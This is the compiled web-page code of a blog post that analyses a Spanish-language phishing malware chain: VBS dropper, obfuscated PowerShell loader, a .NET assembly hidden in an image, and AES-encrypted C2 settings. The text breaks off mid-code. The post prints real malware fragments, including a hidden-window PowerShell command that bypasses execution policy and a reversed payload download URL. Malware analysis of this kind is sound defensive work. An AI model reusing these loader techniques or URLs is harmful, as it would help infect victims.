import{s as ol,i as ne,j as We,h as v,n as Fl}from"../chunks/scheduler.9b9e513e.js";import{S as pl,i as rl,r as Ve,u as Oe,v as Re,d as Xe,t as Qe,w as Ye,g as o,s as n,H,h as F,A as c,c as t,F as P,k as r,a as l,f as a}from"../chunks/index.781c9930.js";import{P as cl,g as il,a as ze,b as yl}from"../chunks/profile.d44cdb83.js";import"../chunks/posts.bddda4f7.js";function dl(m){let p,E='<a href="https://t.me/kwaabot" rel="noopener external" target="_blank" class="flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#26a5e4] hover:bg-[#0088cc] flex items-center"><span class="i-simple-icons-telegram absolute w-16 h-16 left-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">@kryptoenix</span></a> <a href="https://discord.com/users/349550824202043392" rel="noopener external" target="_blank" class="flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#5865f2] hover:bg-[#7983f5] flex items-center"><span class="i-simple-icons-discord absolute w-16 h-16 right-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">Kryptoenix#1929</span></a> <a href="https://t.me/kwaabot" rel="noopener external" target="_blank" class="flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#424040] hover:bg-[#757272] flex items-center"><span class="i-simple-icons-telegram absolute w-16 h-16 left-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">📂 Kryptoenix</span></a>';return{c(){p=o("div"),p.innerHTML=E,this.h()},l(y){p=F(y,"DIV",{class:!0,"data-svelte-h":!0}),c(p)!=="svelte-l8738u"&&(p.innerHTML=E),this.h()},h(){r(p,"class","flex flex-col md:flex-row gap-4 mt-4 justify-center")},m(y,d){l(y,p,d)},p:Fl,d(y){y&&a(p)}}}function El(m){let p,E='<a href="#introduction">Introduction</a>',y,d,i="Hello there, welcome to the board! I’m openning this blog series with an exciting topic: malware analysis. I will start by collecting pieces for our puzzle and continue to combine them until, by the end of journey, each piece contributes to the bigger picture.",D,u,te='<a href="https://bazaar.abuse.ch/" rel="nofollow noopener noreferrer external" target="_blank">MalwareBazaar</a> website provides a large database of malware samples, where researchers can report different files which might seem suspicious. Today, while I was searching for potential subject for analysis, I stumbled upon an interesting archive. This was found as part of an email attachment in a malware campaign. The sample can be found <a href="https://bazaar.abuse.ch/sample/76fbfcb8754ba7e23c855a71db83aae75c106d84e106330b772cf3a28a440993/#comments" rel="nofollow noopener noreferrer external" target="_blank">here</a>.',hs,f,oe='<a href="#first-sign-of-malicious-code">First sign of malicious code</a>',gs,$,Fe="The initial archive contains a disk image (<code>.img</code>) file, a known format for executing code once the victim clicks the file. If this is not yet suspicious, let’s inspect for visible signs that might indicate unwanted behaviour such as download links. For this step, I used a powerful utiliy called <code>binwalk</code>, capable of extracting bundled files.",Cs,ns,Ze=`<pre class="shiki material-default with-title" style="background-color: #263238; color: #EEFFFF" shell="true" title="extract files from disk image"><div class='code-title'>extract files from disk image</div><div class="language-id">shell</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">binwalk -e Damaged_item.img</span></div></code></div></pre>`,ts,I,pe="Now, a new folder <code>iso-root</code> contains a friendly-looking <code>VBS</code> script.",bs,h,re,ws,j,ce="The script simply tries to download the content found at a Pastebin link and then execute the fetched code using <code>ExecuteGlobal</code> function. Good news, the link was suspended and therefore, the following code cannot be executed anymore, preventing victims from infection. Defenders and Pastebin support did great work in such a short period of time (less than 18h :)). Fortunately, I was able to extract the next stage of <code>VBS</code> code (the code from Pastebin link) before removal. Let’s analyse it!",xs,g,ie,_s,N,ye="We are dealing with some obfuscation, so it would be faster if we can find a way to print the final code (after deobfuscation, but before execution). This way, we can get a clear understanding of what’s under the hood. Some hints suggest that deobfuscated code is <code>powershell</code>. The plan is to write the final code to a powershell script.",As,os,Je=`<pre class="shiki material-default with-title" style="background-color: #263238; color: #EEFFFF" js="true" title="code appended to the end of obfuscated VBS"><div class='code-title'>code appended to the end of obfuscated VBS</div><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #FFCB6B">Set</span><span style="color: #EEFFFF"> fso </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">CreateObject</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Scripting.FileSystemObject</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">)</span></div><div class='line'><span style="color: #FFCB6B">Set</span><span style="color: #EEFFFF"> outputFile </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> fso</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">CreateTextFile</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">deobfuscated.ps1</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> True)</span></div><div class='line'><span style="color: #EEFFFF">outputFile</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">WriteLine durguete</span></div></code></div></pre>`,Fs,q,de="Once we append this code and execute the whole script, <code>deobfuscated.ps1</code> file will help us in the next stage.",Ts,C,Ee='<a href="#new-language-old-friend">New language, old friend</a>',ks,G,De="It becomes clear that attacker tries to hide as much as possible by adding polimorphic code, with many layers of obfuscation. The recovered <code>PS1</code> script replaces some substrings in <code>$codigo</code> string, decodes it in <code>base64</code> and executes the code using a classic powershell technique.",Bs,ps,sl=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" powershell="true"><div class="language-id">powershell</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">powershell </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">command </span><span style="color: #89DDFF">"$</span><span style="color: #EEFFFF">codigo</span><span style="color: #C3E88D"> = 'ZgB1DgTreG4DgTreYwB0DgTreGkDgTrebw &lt;-- stripped --&gt; eKQB9DgTreCDgTreDgTrefQDgTre=';</span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">oWjuxd</span><span style="color: #C3E88D"> = [system.Text.encoding]::Unicode.GetString([system.convert]::Frombase64string( </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">codigo</span><span style="color: #C3E88D">.replace('DgTre','A') ));powershell.exe -windowstyle hidden -executionpolicy bypass -Noprofile -command </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">OWjuxD</span><span style="color: #89DDFF">"</span></div></code></div></pre>`,rs,U,ue="After decoding, we are left with another powershell script. It is more verbose than the previous one.",Ms,b,ve,Ss,W,me="Let’s break it into smaller pieces. The variable <code>@links</code> contains links used by <code>DownloadDataFromLinks</code> function to download an image (chosen at random). Now comes the interesting part. The actual downloaded image contain an embedded <code>.NET</code> assembly (<code>$loadedAssembly</code> and <code>GetMethod</code> are clear signs that we are dealing with .NET code). I will adapt this PS1 script such that, after downloading and decoding are complete, variable <code>$commandBytes</code> will write its content to an output file <code>malware-net</code>. Below is a small snippet of what’s being changed in the original code:",Ls,cs,el=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> ($startIndex </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">ge </span><span style="color: #F78C6C">0</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">and $endIndex </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">gt $startIndex) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">$startIndex</span><span style="color: #F07178"> </span><span style="color: #89DDFF">+=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">$startFlag</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Length</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">$base64Length</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">$endIndex</span><span style="color: #F07178"> </span><span style="color: #89DDFF">-</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">$startIndex</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">$base64Command</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">$imageText</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Substring</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">$startIndex</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">$base64Length</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">$commandBytes</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> [</span><span style="color: #EEFFFF">System</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Convert</span><span style="color: #F07178">]::</span><span style="color: #82AAFF">FromBase64String</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">$base64Command</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">$commandBytes</span><span style="color: #F07178"> </span><span style="color: #89DDFF">|</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">Out</span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">File</span><span style="color: #F07178"> </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">FilePath</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">malware-net</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">            &#125;</span></div></code></div></pre>`,is,z,fe='Additional decoding is required in order to extract the assembly properly. For that, CyberChef will simplify things a lot using <a href="https://gchq.github.io/CyberChef/#recipe=Decode_text(&#39;UTF-16LE%2520(1200)&#39;)Find_/_Replace(%257B&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;%255C%255Cr%255C%255Cn&#39;%257D,&#39;%2520&#39;,true,false,true,false)From_Decimal(&#39;Space&#39;,false)" rel="nofollow noopener noreferrer external" target="_blank">this recipe</a>.',Hs,w,he='<a href="#decompiling-the-culprit">Decompiling the culprit</a>',Ps,K,ge="We take a look at the first bytes and notice that they represent the file signature for an executable <code>.EXE</code>. Inspect it’s properties to gain new insights.",$s,x,Ce,Is,V,be="Seems like this campaign is addressed to spanish speaking victims. Maybe it was sent to employees of some companies since the description is related to <code>Automation project</code>?",js,O,we='So far, the executable won’t pose dificulties because it’s written in an intepreted language, making it easier to retrieve the original code. <a href="https://github.com/icsharpcode/ILSpy" rel="nofollow noopener noreferrer external" target="_blank">ILSpy</a> is a great tool for decompiling .NET binaries, suitable for our purpose. (Open the image in a new tab if you don’t see the code)',Ns,_,xe,qs,R,_e="This is one functionality of the binary through which the malware tries to gain persistence by abusing widely-known start-up registry <code>SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>. Other functionalities found include: using D/Invoke syscall, creating new processes under the path of <code>cmd.exe</code> and another one related to .NET framework.",Gs,A,Ae,Us,X,Te="Remember that in previously discussed powershell script, a method was invoked on this assembly, <code>VAI</code>:",Ws,ys,ll=`<pre class="shiki material-default with-title" style="background-color: #263238; color: #EEFFFF" js="true" title="snipped from second powershell script"><div class='code-title'>snipped from second powershell script</div><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">$method </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> $type</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">GetMethod</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">VAI</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Invoke</span><span style="color: #EEFFFF">($null</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> [object[]](</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">441ae23bb6fe-0269-74a4-c2ae-4ebc2dab=nekot&aidem=tla?txt.102061mrowxnhoj/o/moc.topsppa.64038-metsys-eciovni/b/0v/moc.sipaelgoog.egarotsesaberif//:sptth</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">1</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">C:</span><span style="color: #EEFFFF">P</span><span style="color: #C3E88D">rogramData</span><span style="color: #EEFFFF">'</span><span style="color: #C3E88D"> , </span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">Name </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">,</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> AddInProcess32 </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">,</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">))&#125; &#125;</span></div></code></div></pre>`,ds,Q,ke="In ILSpy, we can see that <code>VAI</code> is responsible for reversing and downloading the file from link. After that, the file obtained is reversed and decoded in base64.",zs,T,Be,Ks,k,Me='<a href="#searching-for-keys">Searching for keys?</a>',Vs,Y,Se="This hunting brought us to a new .NET binary. We can confirm its signature, in Kali:",Os,Es,al=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line highlight'><span style="color: #89DDFF">[</span><span style="color: #EEFFFF">kali@kali -</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF">$ file mal2.exe</span></div><div class='line dim'><span style="color: #EEFFFF">mal2.exe: PE32 executable </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">GUI</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> Intel 80386 Mono/.Net assembly, </span><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> MS Windows, 3 sections</span></div></code></div></pre>`,Ds,Z,Le="Through decompilation, we find a vast number of functions related to malitious behaviour. In <code>Main</code> function, some variables are decrypted using <code>AES</code> in <code>ECB mode</code>. These “setting” variables will be used later in establishing connections between victim and attacker’s C&amp;C infrastructure.",Rs,B,He,Xs,M,Pe,Qs,J,$e="Based on the known values of encrypted strings and encoded key, it is possible to recover the plaintext values using a similar decryption routine used in encryption:",Ys,us,nl=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" csharp="true"><div class="language-id">csharp</div><div class='code-container'><code><div class='line'><span style="color: #F78C6C">using</span><span style="color: #EEFFFF"> System</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F78C6C">using</span><span style="color: #EEFFFF"> System.Security.Cryptography</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F78C6C">using</span><span style="color: #EEFFFF"> System.Text</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Settings</span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Host</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">8wEbreuCNstcX+VMVrMtN79nabenssi23ZA2UwI0sBw=</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Port</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">NHj6D/XmlURhrDZN4bCpqA==</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">KEY</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">tGwHQrFuqEZ9E5eQxvPElQ==</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">SPL</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">A6XU+/uh3DsQy74ojVhAhQ==</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">int</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Sleep</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">3</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">USBNM</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">k6tUhyBB8c9OnCp0im2vjw==</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Mutex</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">mrkh245537gVoEKF</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">AlgorithmAES</span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">input</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #FFCB6B">RijndaelManaged</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">rijndaelManaged</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">new</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">RijndaelManaged</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #FFCB6B">MD5CryptoServiceProvider</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">mD5CryptoServiceProvider</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">new</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">MD5CryptoServiceProvider</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">array</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">new</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">byte[</span><span style="color: #F78C6C">32</span><span style="color: #89DDFF">];</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">sourceArray</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> mD5CryptoServiceProvider</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">ComputeHash</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">UTF8SB</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Mutex</span><span style="color: #89DDFF">));</span></div><div class='line'><span style="color: #EEFFFF">        Array</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Copy</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">sourceArray</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> array</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">16</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Array</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Copy</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">sourceArray</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> array</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">15</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">16</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        rijndaelManaged</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Key </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> array</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        rijndaelManaged</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Mode </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> CipherMode</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">ECB</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #FFCB6B">ICryptoTransform</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">cryptoTransform</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> rijndaelManaged</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">CreateDecryptor</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">array2</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> Convert</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">FromBase64String</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">input</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">decryptedBytes</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> cryptoTransform</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">TransformFinalBlock</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">array2</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> array2</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Length</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">UTF8BS</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">decryptedBytes</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">private</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">UTF8SB</span><span style="color: #89DDFF">(string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">s</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> Encoding</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">UTF8</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">GetBytes</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">s</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">private</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">UTF8BS</span><span style="color: #89DDFF">(byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">b</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> Encoding</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">UTF8</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">GetString</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">b</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Main2</span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">void</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">Main</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Host </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> AlgorithmAES</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Host</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">WriteLine</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Decrypted Host: </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Host</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Port </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> AlgorithmAES</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Port</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Console</span><span style="color: 